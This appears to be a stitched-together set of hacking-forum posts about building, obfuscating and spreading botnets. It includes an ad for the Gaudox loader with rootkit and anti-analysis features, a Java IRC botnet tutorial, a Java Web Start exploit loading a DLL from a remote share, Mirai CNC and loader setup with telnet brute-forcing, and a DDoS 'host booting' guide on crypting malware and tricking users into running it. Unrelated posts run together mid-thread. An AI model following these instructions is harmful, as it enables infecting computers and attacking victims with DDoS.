Project is closed, download link is not available anymore, don't ask for it. Gaudox HTTP Gaudox is an HTTP loader completely coded from scratch in C/C++ language with a few lines of Assembly, which means that it does not require of any dependencies ( C-Runtime, NET Framework, Java VM ). The bot has been fully tested and working on all Windows versions from Windows XP SP2 to Windows 10 (32/64-bit). It is also worth mentioning that I coded this bot with very efficient and stable designed code to handle thousands of connections at once. Features: Usermode Rootkit Bot has Rootkit functionality which hides all bot resources and prevents from being accessed from explorer process. This feature does not drop any to disk, the code is internally embedded in the bot file and injected in the target process from memory. It is also has self-protection that prevents the hooks from being removed by third-party programs or any security tool. This feature is currently working on 32-bit systems. Persistence/Watchdog Bot prevents it from being removed from the system by bot killers, security tools or user actions. This feature is currently supporting process protection and working on both 32/64-bit systems but its maximum compatibility is in 32-bit. Traffic Encrypted The communication between the bot and the control panel is obfuscated. This prevents middle attacks. Anti-Analysis/Research Bot contains several methods for preventing from being analyzed by researchers or unauthorized users. some methods are from preventing static analysis by obfuscating code, data up to detect the presence of debuggers, avoid running the bot in virtualized environments, etc. some methods may not be mentioned. Commands: [+] Download and execute (Drop&Exec) [+] Visit Website (Visible) [+] Update Client [+] Uninstall Client Panel [img]http://i.imgsafe.org/627e2d4.jpg[/img] [img]http://i.imgsafe.org/e1736c8.jpg[/img] ( got this screenshot on jabber ) [img]http://i.imgsafe.org/acb1430.jpg[/img] [img]http://i.imgsafe.org/bb2c161.png[/img] [img]http://i.imgsafe.org/3194cfd.png[/img] Builder [img]http://i.imgsafe.org/251b9fb.jpg[/img] [img]http://i.imgsafe.org/27a48f1.jpg[/img] [img]http://i.imgsafe.org/29caf7e.jpg[/img] [img]http://i.imgsafe.org/2c55ddc.jpg[/img] [img]http://i.imgsafe.org/a91d043.jpg[/img] Gaudox v 1.1.0.1.exe MD5: 1AF2E1B11B1D7543A19662F7291856F4 SHA-1: DE5BD976FB5A4B50D8C8739E6B9F286F5B1A4798 1.1.0.1.rar MD5: F99A3FBDEB1B0CD12BB1E6ED700ADE90 SHA-1: A00A2B6D6C5806C75C5551073283D1218AC017C8 How to install: 1) Open the Builder and create a new profile, you will use these values KEY #1 and KEY #2 in the panel. 2) Create a new database (recommended) 3) Open setup.php with browser and complete the form. 4) Delete setup.php and open login.php with browser. 5) When creating the bot clients do not forget to use the same profile you used to install the panel, otherwise the bots will not connect to the panel. Notes: 1) I highly recommend disabling strict mode in MySQL. 2) I f you test the bot from a local server, the panel may be showing "US" in location, it's not an _error_, the panel expects to always get an external IP. Tut by Jar1: https://hackforums.net/showthread.php?tid=5084324 How to update: 1.1.0.0 to 1.1.0.1+ You will need to install the panel again, sorry for the inconvenience. The database is now the final version and it would be compatible with all future versions ( I hope, unless I have forgotten something or want to add a new feature, in any case I will code a script to update the database ). Changelog: Spoiler (Click to View) 1.1.0.1 (15-12-2015) Code Bot * Fixed issue with Uninstall command * Anti-Virtual machine methods have been enabled Panel * Fixed issue with location * Added captcha in login page 1.1.0.0 (30-11-2015) Code Bot * Implemented Ring3 Rootkit for 32-bit versions of Windows * Implemented Watchdog/Persistence to prevent from being removed * Communication between the bot and the control panel is now encrypted * Anti-Analysis/Researching methods added * Core improved Panel * Panel completely recoded and using PDO extension which means it's more secure against SQL injections and other attacks. * Improved the appearance of the panel, images for countries were added, ability to change password, etc. 1.0.0.0 (15-10-2015) Code * First release

Well, To that kid who accused me of ripping my old tutorial. Go google "Java botnet" You will find about 30 of MY tutorial. Any way, The tutorial was written in a matter of minutes so i'm going to help you properly here. Made by dj mint off hackforums. Ok, First off you need an IRC channel (Two helps!) and you need to have java JDK installed on your computer. Now this usually comes with most computers now. 1) If you don't have java download it here Code http://java.sun.com/javase/downloads/index.jspIt's the very first one, You really can't miss it. 2) Ok, So now we have java installed. Next we are going to need the botnet source (SCR) Now this one i use i can't remember who made it but credit goes to him/her. Code http://www.#/?d=BLA2ST3UI re-uploaded it under my name so no one can call me a ripper. (changed the link because i forgot to delete the class files in there) 3) Ok, So now you have the source and you should of unpacked it. You should have all these files which you have no clue what are. They should all be file like "something.java" You open these files in notepad or wordpad. First off were going to edit the config.php This is not a java file. 4) Ok, The config.php looks as follows. Code SERVER: IRCSERVERHERE</br>PORT: IRCPORTHERE</br>IN_CHANNEL: #channlename1</br>OUT_CHANNEL: #channlename2</br>IN_PASSWORD: putanythinghere </br>OUT_PASSWORD: putanythinghere </br>NICK: [L0L]</br>CONTROLLERS: Owner1,owner2,owner3,owner4</br> For the people who still don't understand that. SERVER you put the IRC Server. (irc.domain.com or what ever) The PORT you put the IRC port. IN_CHANNEL is the channel you control the bots on like give commands. OUT_CHANNEL is the channel the bots will answer. So if i did .getip in channel1 they would respond on channel2 with there ip's. The password is the IRC channel password. If you don't have one set just put it as lol or some thing or the bots don't connect at all. The Controllers are the people which control the botnet. You can add as many as you want. Make sure there separated by a "," 5) Got that filled out? Not that hard was it? Now you need to upload that to a host. Now this bit confuses people. By this i don't mean #. A site like www.mysite.com/config.php A site where you can view the php page. Just google free hosts or even use freewebs. 6) Ok now were going to edit Constants.java I'll break this down too. Code public static final double BOT_VERSION = 2.3; public static final String MAIN_HOST = "IRCHOSTHERE"; public static final String CONF_URL = "www.mysite.com/config.php"; public static final String BACKUP_HOST = ""; public static final String CONF_URL_BACKUP = ""; public static final String IP_ADDR_URL = "http://whatismyip.com/automation/n09230945.asp"; public static final int FILE_SERVER_DEFAULT_PORT = 3943; public static final String INI_FILE_LOC = "C:\\Program Files\\win32.ini"; public static final String PASSWORD = "lol"; MAIN_HOST = The IRC host CONF_URL = The Config file you uploaded to your site on the last step BACKUP_HOST = If your IRC ever went down you make the bots join another one. CONF_URL_BACKUP = Backup for the config file. IP_ADDR_URL = Don't touch it. FILE_SERVER_DEFAULT_PORT = Don't touch it. INI_FILE_LOC = Again don't touch it. PASSWORD = The password you put in the config file. Mines always lol. 6) Ok, Saved that? Yeaaay your almost there! Now we need to compile the botnet. To do this i have included a file called compile.bat, Now you should be able to just double click it and it should pop up and saying compiling then close on you. Then if you look back at the folder you will have loads of .class files. Ignore this if the compiler worked for you If you get the "javac" _error_" Right click compile.bat and click edit. It looks like this Code @echo off color 0b title SERVER NAME Compiler @echo ---------------------- @echo --Initiating Compile-- @echo ---------------------- "C:\Program Files\Java\jdk1.6.0_14\bin\javac.exe" -cp . *.java @echo ---------------------- @echo --Compiling complete-- @echo ---------------------- @echo off title SERVER NAME server "C:\Program Files\Java\jre6\bin\java.exe" -Xmx500m server The bit you want to edit is Code "C:\Program Files\Java\jdk1.6.0_14\bin\javac.exe" -cp . *.java The "jdk.1.6.0_14" One of the reasons you could be getting javac _error_ (This is the most common any way) Go find your way to your java folder and see what version you have and change the version number as needed. Save the file and run again. 7) Ok now we have lots of new files. Now personally i get all the new files (.class) and put them into a folder called built. This will help trust me. Ok, Now were going to open jshrink.jar (This is NOT a botnet but some thing we use to compile the botnet) Click the license tab. If there isn't a code in there put Code 31-12-2099 CANCQJUQKEOQKKLI Now leave it up and go into the "Built" folder you made earlier with all the .class files in. Select them all and drag them onto the white part of jshrink. Now go into the options tab and check "String encryption" Make it harder for people to get your IRC information. Ok now click File > save as navigate to where you want to save the botnet to and call it jusched.jar. wohohohohoh you have a botnet. 8) Now to test if this thing works. Run it. You should get a bot joining your IRC channels. (In and the out) To remove the botnet follow the steps below Start>Run>msconfig>Click startup tab>Uncheck jusched Sorted. For commands on the botnet do .commands in the IN channel and look at the OUT channel Need any help please PM me :) Made by dj mint off Hackforums

These parameters can be controlled by attackers via specially crafted embed html tags within a webpage. Let's see JavaDeploy.txt: if (browser == 'MSIE') { document.write('<' + 'object classid="clsid:8AD9C840-044E-11D1-B3E9-00805F499D93" ' + 'width="0" height="0">' + '<' + 'PARAM name="launchjnlp" value="' + jnlp + '"' + '>' + '<' + 'PARAM name="docbase" value="' + jnlpDocbase + '"' + '>' + '<' + '/' + 'object' + '>'); } else if (browser == 'Netscape Family') { document.write('<' + 'embed type="application/x-java-applet;jpi-version=' + deployJava.firefoxJavaVersion + '" ' + 'width="0" height="0" ' + 'launchjnlp="' + jnlp + '"' + 'docbase="' + jnlpDocbase + '"' + ' />'); } That's it. This is how JAVA Plugin identifies Java Web Start content (jnlp files).So We can inject command-line parameters through "docbase" tag and even "launchjnlp". What type of arguments can we abuse to compromise a system? java.exe and javaw.exe support an undocumented-hidden command-line parameter "-XXaltjvm" and curiosly also "-J-XXaltjvm" (see -J switch in javaws.exe). This instructs Java to load an alternative JavaVM library (jvm.dll or libjvm.so) from the desired path. Game over. We can set -XXaltjvm=\\IP\evil , in this way javaw.exe will load our evil jvm.dll. Bye bye ASLR, DEP... Linux Same logic _error_, check this function "_Z10launchJNLPPKcS0" in libnpjp2.so MACOSX Not vulnerable. Workaround Disable javaws/javaws.exe in linux and Windows by any mean. Disable Deployment Toolkit to avoid unwanted installation as stated in Tavis' advisory.

Because resumes tend to originate from unknown sources, this is not thought to be abnormal and the user opens the untrusted file. The malicious file then uses a Word vulnerability to run arbitrary code under the context of the logged-in user. However, the "arbitrary code" is actually a separate exploit, which launches a separate attack against the local system. The second exploit has elevated the final payload code to SYSTEM level, allowing for full system compromise, including the installation of a rootkit or backdoor. Source: http://www.scmagazineus.com/hot-or-not-l...cle/34794/

DrugsAnyone?, it is obvious from your posts that you have little experience with the internals of the Windows Operating system. Also, my signature is a reference to my roots in hacking. The first "hack" I pulled off was scheduling a task to execute cmd.exe in interactive mode, thus gaining system privileges. While this is not new or "leet" (and I am not saying I discovered it either!), it is very significant to me. Local privilege escalation (exploit or system feature) can indeed execute processes to bypass UAC or other things such as installing programs. If you were an experienced Windows programmer you would know this. A way to escalate your privileges via the Windows API is to create a service. Your service/program will execute prior to users logging in and depending on what settings you created the service with, the service typically runs under LocalSystem. Another example of an OS provided local privilege-escalation method is called impersonation. With impersonation you can run any process with the credentials, tokens, and privileges as another user. If the user you wish to impersonate has higher or more privileges than you, this is called privilege escalation. Privilege escalation is indeed a core part of newer trojans and malware as Windows Vista runs programs as a limited user by default. Making system wide changes is nearly impossible without administrative privileges, so in many cases malware will attempt to escalate their privileges either by using an exploit or an OS provided facility (UAC prompt to gain admin). Privilege escalation exploits were once very common on earlier Windows NT systems such as 2000 with pipeupadmin and used by malware and power users alike. Anyways, I'd rather not spend time writing an article about privilege escalation just for you to passively skim-read because you are nothing more than a skid with typing skills.

@assassin2005 Could you please put a screenshot of the problem. Thanks! @Fike Thanks for compliment. About the IRC channel and key. How a IRC channel works is when everyone leaves a channel, the channel goes back to defualt. The default usually means no more key, no set ops, the topic is gone, its back to the way you found it. There are a few ways to keep the channel to the settings you want. Keeping settings for IRC channel: 1. Register your channel. If the IRC channel supports ChanServ, then you can register your channel and claim it for yourself. If your new to IRC, i wouldnt recommend this. 2. The only way to keep a channel alive is if one person stays in the channel. You can keep the channel alive by inviting a command Bot(NOT A Zombie). The bot will idle in the channel while you are gone and thus, keep your channel alive. 3. Get a bunch of zombies in your IRC channel. If you have enough zombies, then there will always be one zombie in the channel and will keep it alive. 4. Get the admin to do it for you. This is what most people on Hackfourms that sell server spots do. @ cyberthug If the infected machine isnt connect to the internet, then they cannot connect back to the IRC. So if the PC is shutdowm, restarted, or not connect to the internet, then the bot will not connect. Not to mention, if the AV picks it up or they block the program from running because of their firewall, then it wont work.

LiteHTTP What is it? LiteHTTP is an HTTP bot that is being programmed in C#, on the .NET 2.0 dependency. Why are you doing this? Lately there's been lots of cracked bots, false promises, and backdoored bins that have given HackForums a bad name. With the newest thing being LoadHTTP, I decided I'm going to make a FREE HTTP bot and release it to the community. I have nothing to hide, so if you must, the builder that I plan to release will not be obfuscated. Feel free to look at the source, it won't bother me. I'm not out to infect members, steal bots, or even backdoor my builder or bins. This bot is not going to be anything super special. It will have the basic features that an HTTP botnet would require. Below you'll find a list of all features that can be expected in the upcoming release. Expected Features (Note: more features may be added, this is only a rough estimate)PanelCustom coded with a sleek yet maneuverable design Ability to have more than 1 user User privileges Action logs for all users BotDownload & execute (with option to inject if native) Visit webpage (visible or hidden) Startup (with persistence) Information about bot (aka. OS, version, installed location, etc.) Basic botkiller (nothing fancy) Update Uninstall Have a feature you'd like to see? If you have a feature that you would like to see in the bot, feel free to post or PM me. I'll consider all suggestions, but please keep in mind this bot is not going to be too advanced. I MAY consider adding a plugin system, but if this is the case, I do NOT want to see people selling plugins for personal profit. This is a community bot, not a way for you to make money off of somebody else's work. Requirements Bare Minimum 2 servers: 1 for CNC + mysql, 1 for scan receiver, and 1+ for loading Pro Setup (my setup) 2 VPS and 4 servers - 1 VPS with extremely bulletproof host for database server - 1 VPS, rootkitted, for scanReceiver and distributor - 1 server for CNC (used like 2% CPU with 400k bots) - 3x 10gbps NForce servers for loading (distributor distributes to 3 servers equally) Infrastructure Overview - To establish connection to CNC, bots resolve a domain (resolv.c/resolv.h) and connect to that IP address - Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot, and uses almost 20x less resources. When finding bruted result, bot resolves another domain and reports it. This is chained to a separate server to automatically load onto devices as results come in. - Bruted results are sent by default on port 48101. The utility called scanListen.go in tools is used to receive bruted results (I was getting around 500 bruted results per second at peak). If you build in debug mode, you should see the utitlity scanListen binary appear in debug folder. Mirai uses a spreading mechanism similar to self-rep, but what I call "real-time-load". Basically, bots brute results, send it to a server listening with scanListen utility, which sends the results to the loader. This loop (brute -> scanListen -> load -> brute) is known as real time loading. The loader can be configured to use multiple IP address to bypass port exhaustion in linux (there are limited number of ports available, which means that there is not enough variation in tuple to get more than 65k simultaneous outbound connections - in theory, this value lot less). I would have maybe 60k - 70k simultaneous outbound connections (simultaneous loading) spread out across 5 IPs. Configuring Bot Bot has several configuration options that are obfuscated in (table.c/table.h). In ./mirai/bot/table.h you can find most descriptions for configuration options. However, in ./mirai/bot/table.c there are a few options you *need* to change to get working. - TABLE_CNC_DOMAIN - Domain name of CNC to connect to - DDoS avoidance very fun with mirai, people try to hit my CNC but I update it faster than they can find new IPs, lol. Retards :) - TABLE_CNC_PORT - Port to connect to, its set to 23 already - TABLE_SCAN_CB_DOMAIN - When finding bruted results, this domain it is reported to - TABLE_SCAN_CB_PORT - Port to connect to for bruted results, it is set to 48101 already. In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file Run this inside mirai directory Code ./build.sh debug telnetYou will get some errors related to cross-compilers not being there if you have not configured them. This is ok, won't affect compiling the enc tool Now, in the ./mirai/debug folder you should see a compiled binary called enc. For example, to get obfuscated string for domain name for bots to connect to, use this: Code ./debug/enc string fugg.the.police.com The output should look like this Code XOR'ing 20 bytes of data... \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22 To update the TABLE_CNC_DOMAIN value for example, replace that long hex string with the one provided by enc tool. Also, you see "XOR'ing 20 bytes of data". This value must replace the last argument tas well. So for example, the table.c line originally looks like this [/code] add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com [/code] Now that we know value from enc tool, we update it like this Code add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fugg.the.police.com Some values are strings, some are port (uint16 in network order / big endian). Configuring CNC Code apt-get install mysql-server mysql-clientCNC requires database to work. When you install database, go into it and run following commands: http://pastebin.com/86d0iL9g This will create database for you. To add your user, Code INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, ''); Now, go into file ./mirai/cnc/main.go Edit these values Code const DatabaseAddr string = "127.0.0.1" const DatabaseUser string = "root" const DatabasePass string = "password" const DatabaseTable string = "mirai" To the information for the mysql server you just installed Setting Up Cross Compilers Cross compilers are easy, follow the instructions at this link to set up. How to build bot + CNC In mirai folder, there is build.sh script. Code ./build.sh debug telnetWill output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder Code ./build.sh release telnetWill output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: "mirai.$ARCH" to ./mirai/release folder Building Echo Loader Loader reads telnet entries from STDIN in following format: Code ip:port user:passIt detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget. You can find code to compile the tiny downloader stub h ere http://santasbigcandycane.cx/dlr.src.zip You need to edit your main.c for the dlr to include the HTTP server IP. The idea is, if the iot device doesn have tftp or wget, then it will echo load this 2kb binary, which download the real binary, since echo loading really slow. When you compile, place your dlr.* files into the folder ./bins for the loader Code ./build.shWill build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this Code cat file.txt | ./loader Remember to ulimit! Host Booting Tutorial Written by Brent328 Please give credit if you post this elsewhere. *Note* All of these programs are detected as viruses. I promise you they aren't, and won't cause any harm to your computer as long as they're used correctly. What is Host Booting? Host Booting is a form of DDoS (Distributed Denial of Service). You build a botnet which are zombies/bots (infected computers), and you attack a specified IP with a Clay Davis load of packets. The person's modem or router becomes overwhelmed with information and slows down, possibly stops working depending on the size of your attack. Host booters are usually used for cheating in video games, but many have a TCP or SYN flood options for attacking websites. Another way to DDoS is using IRC botnets, to learn how to make an IRC botnet, click here. Host Booters (click images for download) DaRK DDoSeR [IMG]http://darkddoser.com/new/images/stories/main-1.png[/IMG] MeTuS Delphi 2.8 *Uses any port [IMG]http://i1104.photobucket.com/albums/h325/hostbooting/delphi.png[/IMG] DDoSeR 3.0 *Uses any port [IMG]http://i1104.photobucket.com/albums/h325/hostbooting/30.png[/IMG] Metus 2.0 GB Edition *Uses port 3176 [IMG]http://i1104.photobucket.com/albums/h325/hostbooting/gbedit.png[/IMG] BioZombie *Uses port 3174 [IMG]http://i1104.photobucket.com/albums/h325/hostbooting/bio1.png[/IMG] Creating Your Bot/Virus For MeTuS Delphi 2.8 (Click to View)Sign up HERE and make a redirect host to your IP address. Open up MeTuS Delphi and go to the "Server Builder" tab. Put your no-ip redirect host that you created in the "Host" text box. Choose the port and stuff you want to use for connections. Edit all other settings to your liking, then click the "Build" button. The server you just created will be in the same folder that the client is located. Go to the "Options" tab in the client and put the port that you used to create your server in the "Auto-Listen Port" textbox and then click "Save Settings" Now all you need to do is spread the server.exe. I would recommend crypting it first because it's highly detected. For MeTuS GB Edition (Click to View)Click "File" at the top and and then click "Build Server" Sign up at no-ip.com and make a redirect host to your IP. Type your no-ip host you created in the "Redirect Host" text box and then click "Create Server" Select where to save your bot and click save. For BioZombie (Click to View) Help: http://www.youtube.com/watch?v=Na3boKQ9A0IYou will need Hex Workshop in order to make the bot connect to you. You can download v5 HERE. You can register it using this serial: 0749100408-037553-1EB4 Right click on the bot file and click "Hex Edit with Hex Workshop" Press CTRL + F to open the Find box. For "Type:" scroll down to "Text String". Once you've done that click on "Either" on the options. Now for the "Value" type in "EDIT" and click OK. Now you'll see "EDITT22.no-ip.info", so now you will have to go to HERE Be sure to use a real email address because you will need to verify it. Now login to and click "Add a Host" make your no-ip hostname 7 charactors. Example :: ABCD123.no-ip.info Go back to your Hex Workshop and edit the "EDITT22" to the no-ip you chose. Go to File > Save. Spreading Your Bot/Virus Spreading is the hardest part of the process, finding where all the stupid people download from. One method of spreading is torrents. To find out how to make and spread torrents click here. Another method is YouTube videos. You make a video of something that someone wants, upload your virus to a downloading site like MediaFire and say it's what they want. You can also spread on forums. I won't explain it all, just say it's something that the members would want and post it for download. Crypting and Binding Binders and crypters are used to make your virus less detectable by Anti-Virus programs. Binders allow you to combine your virus with another file, meaning that both files will open. Crypters are used to usually just make your virus less detectable. Some advanced ones can compress and do a lot of other things too. There are a lot of free ones, but paid and privately sold crypters are usually much better. Port Forwarding You need to open ports to accept the incoming connections from the infected zombies, and also to send outgoing commands to them. (02-21-2010, 07:38 PM)M0D3RN H4X3R 2ï¿_ï¿_ Wrote: Please note, Blackout DDoSeR weren't created for small botnets of 200-500. It was created for HUGE botnets I am guessing about the commands here and made up commands that would be as small as possible. I do not know what commands the bot uses, so this is more of an educated guess, but a pretty accurate one. I am going to show that the principle behind the bot will host a big net, even on metered bandwidth. Warning, contains math! Spoiler (Click to View) For example lets say you have a host with a 20gb bandwidth limit for the month, and that your bots are online 24/7 The command Code u_98.34.24.233:80 is 17 bytes the bot loads the txt file every 15 seconds, and there are 60 seconds in a minute Code 60 / 15 = 4so the text file will be loaded 4 times a minute Code 17 * 4 = 68 bytes per minute60 minutes in an hour Code 68 * 60 = 4080 bytes per hour for one bot24 hours in a day Code 4080 * 24 = 97,920 bytes (97.92 kb) per day per botMost months have 31 days in them Code 97,920 * 31 = 3,035,520 bytes (3.03552 mb) per month per botSo if you have 333 bots Code 3,035,520 * 333 = 1,010,828,160 bytes (1.01082816 gb) usageSo aproximately, in order to fill your 20gb a month limit Code 333 * 20 = 6660 bots would be neededBut here's the thing, you arent going to be issuing commands 24/7 are you? no. I imagine the client empties the text file when the stop command was issued or the client closed, thereby the loading of the txt file shouldnt hurt your bandwidth because it is transfering a total of 0 bytes So lets say you were using the bot heavily, like 50% of the time a command was posted (this would be very heavy usage), since half the time no bandwidth is used, then it cuts our bandwidth usage in half, thereby doubling the ammount of bots able to be used without exceding the bandwidth limit Code 6660 * 2 = 13320 botsNow heres the thing, you could have multiple hosts, and sending the command to 3 php files for every command wouldn't be that hard (just copying and pasting the php command and editing it to use a different host) So with having active commands on 50% of the time, our bot number triples Code 13320 * 3 = 39960 bots, quite the substantial netNow this is all theory, but this looks like it could be a very bandwidth friendly way of controlling bots The only big issue besides your host shutting you down that I can think of, is that all those bots connecting to your site would probably ddos it, but most people on HF wont even amass a net of that magnitude, so it probably wont affect most of you. Even if you did, I'm pretty sure you would be smart enough to buy some good unmetered offshore hosting. There are some free unlimeted bandwidth sites out there as well.
